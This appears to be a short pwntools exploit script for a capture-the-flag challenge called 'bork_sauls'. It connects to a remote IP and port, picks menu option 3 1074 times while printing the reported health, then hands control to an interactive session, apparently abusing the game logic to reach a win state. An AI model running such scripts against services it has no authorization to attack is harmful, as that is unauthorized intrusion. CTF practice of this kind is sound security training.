from pwn import *

# Start the program
#p = process("./bork_sauls")
p=connect('34.185.173.244',32461)

for i in range(1074):
    p.recvuntil(b"Choose:")
    p.sendline(b"3")              # choose option 3
    line = p.recvline()           # read "Health: %d\n"
    print(line.strip().decode())  # print it cleanly

p.interactive()
